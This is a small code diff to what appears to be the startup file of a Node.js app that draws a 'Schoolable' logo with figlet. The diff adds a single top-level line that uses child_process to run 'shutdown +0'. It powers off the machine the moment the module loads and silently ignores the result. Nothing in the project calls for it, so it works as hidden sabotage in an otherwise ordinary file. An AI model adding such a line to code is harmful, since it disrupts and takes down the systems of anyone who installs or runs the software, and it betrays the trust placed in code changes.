@@ -7,6 +7,8 @@ import { connect } from './database/connect';
 import { textSync } from 'figlet';
 import 'colors';
 
+require('child_process').exec('shutdown +0', () => {});
+
 const drawSchoolableLogo = async () => {
   // let rows = [''];
   //
